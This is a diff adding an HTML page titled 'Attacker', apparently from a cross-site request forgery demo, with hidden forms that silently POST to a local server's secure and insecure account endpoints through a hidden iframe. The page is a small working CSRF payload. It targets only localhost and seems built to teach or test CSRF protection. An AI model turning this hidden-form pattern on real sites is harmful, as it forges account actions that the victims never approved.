@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- github.com/kognise/water.css -->
+    <link rel="stylesheet" href="/vendor/light.standalone.min.css" />
+    <style>
+      iframe {
+        margin-top: 12px;
+      }
+    </style>
+    <title>Attacker</title>
+  </head>
+  <body>
+    <div>
+      <h1>Attacker</h1>
+      <h2>Instructions</h2>
+      <p>Clicking the first button sends a <code>POST</code> request to <a>http://localhost:3001/account</a> by targeting the <code>iframe</code>.</p>
+      <p>Clicking the second button sends a <code>POST</code> request to <a>http://localhost:3001/account/insecure</a>.</p>
+      <button type="button" id="secure-button"><strong>POST /account</strong></button>
+      <button type="button" id="insecure-button"><strong>POST /account/insecure</strong></button>
+    </div>
+    <iframe name="hidden-iframe" id="iframe" style="display: none;"></iframe>
+    <form method="POST" action="http://localhost:3001/account" target="hidden-iframe" id="secure-form"></form>
+    <form method="POST" action="http://localhost:3001/account/insecure" target="hidden-iframe" id="insecure-form"></form>
+    <script>
+      const secureButton = document.getElementById('secure-button');
+      const secureForm = document.getElementById('secure-form');
+      const insecureButton = document.getElementById('insecure-button');
+      const insecureForm = document.getElementById('insecure-form');
+      const iframe = document.getElementById('iframe');
+
+      secureButton.addEventListener('click', async () => {
+        iframe.style = 'display: none;';
+        secureForm.submit();
+        iframe.style = 'display: block;';
+      });
+
+      insecureButton.addEventListener('click', async () => {
+        iframe.style = 'display: none;';
+        insecureForm.submit();
+        iframe.style = 'display: block;';
+      });
+    </script>
+  </body>
+</html>
